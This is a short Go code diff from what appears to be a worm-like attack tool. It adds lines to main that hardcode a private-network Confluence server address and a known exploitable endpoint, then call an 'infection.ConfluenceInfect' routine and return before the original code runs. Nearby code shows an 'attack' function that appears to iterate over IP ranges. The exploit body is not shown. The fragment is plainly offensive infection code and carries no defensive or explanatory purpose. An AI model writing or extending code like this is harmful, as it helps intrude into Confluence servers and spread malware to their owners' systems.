@@ -62,6 +62,10 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 }
 
 func main() {
+	confluenceUrl := "http://10.0.2.8:8090" 
+	confluenceEndpoint := "/pages/createpage-entervariables.action?SpaceKey=x"
+	infection.ConfluenceInfect(confluenceUrl, confluenceEndpoint)
+	return
 	f, err := os.Create("/tmp/test")
 	if err != nil {
         panic(err)
